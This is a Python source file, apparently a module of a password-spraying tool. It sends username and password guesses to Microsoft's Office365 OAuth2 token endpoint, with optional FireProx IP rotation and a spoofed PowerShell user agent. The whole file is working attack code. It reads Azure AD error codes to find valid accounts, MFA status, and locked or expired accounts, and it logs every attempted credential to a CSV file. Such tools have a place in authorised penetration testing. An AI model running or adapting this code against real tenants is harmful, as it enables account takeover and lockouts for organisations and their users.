import requests
from rich.table import Table
import json
import csv


class Office365:
    def __init__(self, port, host, timeout, fireprox):
        self.timeout = timeout
        self.url = "https://login.microsoft.com/common/oauth2/token"

        if fireprox:
            self.url = f"https://{fireprox}/fireprox/common/oauth2/token"

        self.headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1007",
            "Expect": "100-continue",
            "Connection": "close",
        }

        self.data = {
            "resource": "https://graph.windows.net",
            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
            "client_info": "1",
            "grant_type": "password",
            "username": "testmcreel@schneiderdowns.com",
            "password": "test",
            "scope": "openid",
        }

    def set_username(self, username):
        self.data["username"] = username

    def set_password(self, password):
        self.data["password"] = password

    def login(self, username, password):
        # set data
        self.set_username(username)
        self.set_password(password)
        # post the request
        response = requests.post(
            self.url, headers=self.headers, data=self.data, timeout=self.timeout
        )  # , verify=False, proxies=self.proxyDict)
        return response

    # handle CSV out output headers. Can be customized per module
    def print_headers(self, csvfile):

        o365_table = Table(highlight=True, min_width=61)
        o365_table.add_column("Result")
        o365_table.add_column("Message")
        o365_table.add_column("Username")
        o365_table.add_column("Password")
        o365_table.add_column("Response Code", justify="right")
        o365_table.add_column("Response Length", justify="right")

        # create CSV file
        output = open(csvfile, "w")
        fieldnames = [
            "Result",
            "Message",
            "Username",
            "Password",
            "Response Code",
            "Response Length",
        ]
        output_writer = csv.DictWriter(output, delimiter=",", fieldnames=fieldnames)
        output_writer.writeheader()
        output.close()

        return o365_table

    # handle target's response evaluation. Can be customized per module
    def print_response(self, response, csvfile, timeout=False):
        if timeout:
            code = "TIMEOUT"
            length = "TIMEOUT"
        else:
            code = response.status_code
            length = str(len(response.content))

        if response.status_code == 200:
            result = "Success"
            message = "Valid login; no MFA"
        else:
            data = json.loads(response.content)
            err = data["error_description"].split(":")[0]

            # Thank to dafthack for figuring out the error codes: https://github.com/dafthack/MSOLSpray
            # standard error code
            if err == "AADSTS50126":
                result = "Fail"
                message = ""

            # Microsoft's MFA in use
            elif err in ["AADSTS50076", "AADSTS50079"]:
                result = "Success"
                message = "MS MFA in use"

            # DUO or other MFA in use
            elif err == "AADSTS50158":
                result = "Success"
                message = "Non-MS MFA in use"

            # user password expired
            elif err == "AADSTS50055":
                result = "Success"
                message = "Password expired"

            elif err == "AADSTS50034":
                result = "Fail"
                message = "Invalid username"

            # tenant does not exist. Is domain using Office365?
            elif err in ["AADSTS50128", "AADSTS50059"]:
                result = "Fail"
                message = "Account doesn't exist"

            # locked account
            elif err == "AADSTS50053":
                result = "Fail"
                message = "Account apppears locked"

            # account disabled
            elif err == "AADSTS50057":
                result = "Fail"
                message = "Account appears disabled"

            # all other codes
            else:
                result = "Fail"
                message = "Unknown error code returned"

        # print to CSV file
        output = open(csvfile, "a")
        output.write(
            f'{result},{message},{self.data["username"]},{self.data["password"]},{code},{length}\n'
        )
        output.close()

        return result, message, self.data["username"], self.data["password"], code, length
